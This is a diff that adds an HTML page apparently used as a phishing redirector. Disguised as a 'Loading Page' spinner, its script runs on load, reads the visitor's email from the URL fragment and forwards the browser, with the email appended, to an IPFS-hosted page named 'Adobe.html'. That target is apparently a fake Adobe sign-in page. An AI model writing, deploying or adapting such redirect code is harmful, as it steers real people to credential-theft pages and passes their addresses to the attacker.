@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirect Page</title>
+  <script>
+    function redirectPage() {
+      // Get the email from the first link after "#"
+      var email = window.location.hash.substring(1);
+
+      // Append the email to the URL
+      var newURL = "https://ipfs.io/ipfs/QmQDTBooJePtGNWAb2cwPufwxYouxkoZcWHpcVgMUCyjp3?filename=Adobe.html#" + email;
+      
+      // Redirect to the new URL
+      window.location.href = newURL;
+    }
+
+    // Call the redirectPage function when the page loads
+    window.onload = redirectPage;
+  </script>
+<head>
+    <title>Loading Page</title>
+    <style>
+        body {
+            background-color: #f1f1f1;
+            font-family: Arial, sans-serif;
+        }
+        
+        .loader {
+            border: 16px solid #f3f3f3;
+            border-top: 16px solid #3498db;
+            border-radius: 50%;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+</body>
+</html>
